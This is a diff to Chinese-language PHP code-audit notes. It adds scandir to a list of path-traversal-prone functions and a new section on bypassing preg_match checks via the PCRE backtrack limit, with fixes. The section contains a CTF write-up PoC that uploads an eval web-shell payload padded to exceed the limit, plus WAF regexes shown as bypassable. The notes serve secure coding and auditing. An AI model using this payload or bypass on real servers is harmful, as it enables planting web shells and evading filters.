@@ -229,7 +229,8 @@ find /xxcms -type f -name "*.php" | xargs grep -n 'include \$'
 #### 函数
 
 * 文件操作类
-  * 文件存在[file_exists()](https://www.php.net/manual/zh/function.file-exists.php) 检查文件或目录是否存在。如果此处存在目录穿越漏洞，可实现一些探测。
+  * 文件是否存在[file_exists()](https://www.php.net/manual/zh/function.file-exists.php) 检查文件或目录是否存在。如果此处存在目录穿越漏洞，可实现探测某文件是否存在。
+  * 文件和目录是否存在[scandir](https://www.php.net/manual/zh/function.scandir.php) — 列出指定路径中的文件和目录。
   * 文件读取[readfile()](https://www.php.net/manual/zh/function.readfile.php) 文件输出函数。常用于下载，如果此处存在目录穿越漏洞，可实现任意文件下载
   * 文件读取[file_get_contents()](https://www.php.net/manual/zh/function.file-get-contents.php) 文件读取，常用于下载
   * 文件读写[fopen](https://www.php.net/manual/zh/function.fopen.php) — 打开文件或者 URL。 模式可选 读/写/读写
@@ -244,3 +245,95 @@ find /xxcms -type f -name "*.php" | xargs grep -n 'include \$'
 * web应用设计-避免路径可控（尤其关注"文件操作类"的功能与函数）
 * web应用设计-循环替换"某些字符串"为空 如`..` `./` `.\` `\\` `//` 并 使用编程语言函数获取"将要解压的文件夹路径"的"规范路径名" 并判断它是否以预期设计的合法的"目的文件夹"开头
 * web应用设计-使用成熟的压缩解压操作库 避免文件解压过程中出现路径穿越漏洞
+
+
+### 类型4 正则表达式的PCRE回溯次数限制导致绕过判断
+
+#### 设计
+
+如果用`preg_match`对字符串进行正则匹配，一定要使用全等号`===`来判断返回值。
+
+#### 函数
+
+* [preg_match()](https://www.php.net/manual/zh/function.preg-match.php) 执行一个正则表达式的匹配
+
+#### 测试
+
+* pcre回溯次数上限
+  * PHP为了防止正则表达式的拒绝服务攻击(reDOS)，给pcre设定了一个回溯次数上限`pcre.backtrack_limit`
+  * 查看当前环境的回溯次数上限(默认为1000000次) `var_dump(ini_get('pcre.backtrack_limit'));`
+* 绕过的前置条件
+  * 如果用`preg_match`对字符串进行正则匹配，没有使用安全可靠的全等号`===`来判断返回值，而是使用了可被绕过的`==`、或在变量名前加`!`进行判断
+* 构造超长字符串进行利用
+  * 如果匹配过程中超过了PCRE回溯次数限制，就返回`false`，而没有返回预期的`0`或`1`，导致正则表达式的判断被绕过。
+
+
+错误例子1:
+
+某ctf题 正则表达式的判断可被绕过
+```php
+<?php
+function is_php($data){  
+    return preg_match('/<\?.*[(`;?>].*/is', $data);  
+}
+
+if(!is_php($input)) {
+    // 写入文件 进入该代码块则可getshell
+    // fwrite($f, $input); ...
+}
+```
+
+write-up PoC:
+```python
+import requests
+from io import BytesIO
+
+files = {
+  'file': BytesIO(b'aaa<?php eval($_POST[txt]);//' + b'a' * 1000000)
+}
+
+res = requests.post('http://51.158.75.42:8088/index.php', files=files, allow_redirects=False)
+print(res.headers)
+```
+
+
+错误例子2:
+基于php的WAF 正则表达式的判断可被绕过
+
+以下例子都可以通过构造"大量回溯"绕过判断
+```php
+<?php
+//贪婪模式
+if(preg_match('/SELECT.+FROM.+/is', $input)) {
+    die('SQL Injection');
+}
+```
+
+```php
+//非贪婪模式
+<?php
+if(preg_match('/UNION.+?SELECT/is', $input)) {
+    die('SQL Injection');
+}
+```
+
+正确例子:
+
+```
+<?php
+function is_php($data){  
+    return preg_match('/<\?.*[(`;?>].*/is', $data);  
+}
+
+//如果用preg_match对字符串进行匹配，一定要使用===全等号来判断返回值
+if(is_php($input) === 0) {
+    // fwrite($f, $input); ...
+}
+```
+
+#### 修复与防御
+
+如果用`preg_match`对字符串进行正则匹配，一定要使用全等号`===`来判断返回值。
+
+详细参考 [PHP利用PCRE回溯次数限制绕过某些安全限制 | 离别歌](https://www.leavesongs.com/PENETRATION/use-pcre-backtrack-limit-to-bypass-restrict.html)
+
